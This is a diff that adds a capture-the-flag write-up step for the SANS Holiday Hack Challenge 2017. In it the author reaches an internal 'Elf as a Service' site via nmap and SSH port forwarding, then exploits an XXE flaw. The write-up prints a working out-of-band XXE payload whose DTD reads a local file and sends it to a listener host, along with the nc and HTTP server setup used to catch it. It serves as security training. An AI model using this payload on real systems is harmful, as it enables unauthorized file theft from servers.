@@ -541,6 +541,101 @@ http://mail.northpolechristmastown.com/attachments/GreatBookPage4_893jt91md2.pdf
 From the book we learn about the lollipop guild, trying to (allegedly) ruin Christmas. Sha1: `f192a884f68af24ae55d9d9ad4adf8d3a3995258` 
 
 
+# 6) The North Pole engineering team has introduced an Elf as a Service (EaaS) platform to optimize resource allocation for mission-critical Christmas engineering projects at http://eaas.northpolechristmastown.com. Visit the system and retrieve instructions for accessing The Great Book page from C:\greatbook.txt. Then retrieve The Great Book PDF file by following those directions. What is the title of The Great Book page?
+
+Title of the Great Book Page is "The Dreaded Inter-Dimensional Tornadoes" and sha1 is `8943e0524e1bf0ea8c7968e85b2444323cb237af`
+
+To get to the file, you need to first find the eaas server and then exploit an XXE vulnerability to find the page 6. Finding the server is easy, just log on to the l2s server with Alabasters credentials and fire up nmap:
+
+```
+nmap -sn 10.142.0.0/24
+
+Starting Nmap 7.40 ( https://nmap.org ) at 2017-12-29 17:48 UTC
+[snip]
+Nmap scan report for eaas.northpolechristmastown.com (10.142.0.13)
+Host is up (0.0012s latency).
+Nmap done: 256 IP addresses (7 hosts up) scanned in 3.51 seconds
+```
+
+Then for simplicitys sake, I added the eaas.northpolechristmastown.com to my /etc/hosts file and pointed it to 127.0.0.1
+Then I updated the port forwarding rules on the SSH connection to forward the local port 80 to 10.142.0.13:80. To do this you can either 
+restart the SSH connection with the -L parameter or type ~C on the existing connection and you get the ssh configuration shell (notice you will not see the typed ~C on the shell):
+
+```
+alabaster_snowball@hhc17-apache-struts2:/tmp/asnow.7UPtdzQ2Df7NEm1bzW4sHuOX$ 
+ssh> help
+Commands:
+      -L[bind_address:]port:host:hostport    Request local forward
+      -R[bind_address:]port:host:hostport    Request remote forward
+      -D[bind_address:]port                  Request dynamic forward
+      -KL[bind_address:]port                 Cancel local forward
+      -KR[bind_address:]port                 Cancel remote forward
+      -KD[bind_address:]port                 Cancel dynamic forward
+
+alabaster_snowball@hhc17-apache-struts2:/tmp/asnow.7UPtdzQ2Df7NEm1bzW4sHuOX$ 
+ssh> -L 80:10.142.0.13:80
+Forwarding port.
+
+alabaster_snowball@hhc17-apache-struts2:/tmp/asnow.7UPtdzQ2Df7NEm1bzW4sHuOX$
+```
+
+Now you can simply access the site with your browser by visiting the above mentioned url. 
+After browsing through the site, you find that it is possible to either download your current elf order as an XML file or upload a new XML to replace the old one. The devs haven't taken XXE attacks into account and they have left the site vulnerable. To exploit the issue, we start by creating 2 files: evil.dtd and evildata.xml (courtesy to SANS article at https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities)
+
+```
+daMage@kalima:~/ctfs/sans2017/eaas$ cat evil.dtd
+<?xml version="1.0" encoding="UTF-8"?>
+<!ENTITY % stolendata SYSTEM "file:///c:/greatbook.txt">
+<!ENTITY % inception "<!ENTITY &#x25; sendit SYSTEM 'http://10.142.0.3:4443/?%stolendata;'>">
+alabaster_snowball@hhc17-apache-struts1:/tmp/tmp.k7O7ldiYc2$
+
+daMage@kalima:~/ctfs/sans2017/eaas$ cat evildata.xml 
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE demo [
+    <!ELEMENT demo ANY >
+    <!ENTITY % extentity SYSTEM "http://10.142.0.3:8843/evil.dtd">
+    %extentity;
+    %inception;
+    %sendit;
+    ]
+>
+daMage@kalima:~/ctfs/sans2017/eaas$
+```
+
+We then copy the dtd-file to the l2s server and serve it with the pythons SimpleHTTPServer module and set up an nc listener to get the actual data:
+
+```
+alabaster_snowball@hhc17-apache-struts1:/tmp/tmp.k7O7ldiYc2$ python -m SimpleHTTPServer 8843 &
+[1] 29559
+Serving HTTP on 0.0.0.0 port 8843 ...
+alabaster_snowball@hhc17-apache-struts1:/tmp/tmp.k7O7ldiYc2$ nc -lvnp 4443 > test.txt &
+[2] 29580
+```
+
+After setting everything up, it's only required to upload the xml file on the server and witness the results. On the terminal we see:
+
+```
+ - - [29/Dec/2017 18:27:39] "GET /evil.dtd HTTP/1.1" 200 -
+connect to [10.142.0.3] from (UNKNOWN) [10.142.0.13] 49929
+```
+
+then we confirm that we have data:
+
+```
+alabaster_snowball@hhc17-apache-struts1:/tmp/tmp.k7O7ldiYc2$  ls -lah
+total 44K
+drwx------   2 alabaster_snowball alabaster_snowball 4.0K Dec 29 18:27 .
+drwxrwxrwt 361 root               root                28K Dec 29 18:27 ..
+-rw-r--r--   1 alabaster_snowball alabaster_snowball  190 Dec 29 18:27 evil.dtd
+-rw-r--r--   1 alabaster_snowball alabaster_snowball  136 Dec 29 18:27 test.txt
+alabaster_snowball@hhc17-apache-struts1:/tmp/tmp.k7O7ldiYc2$ cat test.txt
+GET /?http://eaas.northpolechristmastown.com/xMk7H1NypzAqYoKw/greatbook6.pdf HTTP/1.1
+Host: 10.142.0.3:4443
+Connection: Keep-Alive
+```
+
+By browsing to http://eaas.northpolechristmastown.com/xMk7H1NypzAqYoKw/greatbook6.pdf we get the next page!
+
 
 # 7) Like any other complex SCADA systems, the North Pole uses Elf-Machine Interfaces (EMI) to monitor and control critical infrastructure assets. These systems serve many uses, including email access and web browsing. Gain access to the EMI server through the use of a phishing attack with your access to the EWA server. Retrieve The Great Book page from C:\GreatBookPage7.pdf. What does The Great Book page describe?
 
@@ -735,3 +830,5 @@ SHA1            C1DF4DBC96A58B48A9F235A1CA89352F865AF8B8                        
 ```
 
 The great book describes the witches of Oz.
+
+
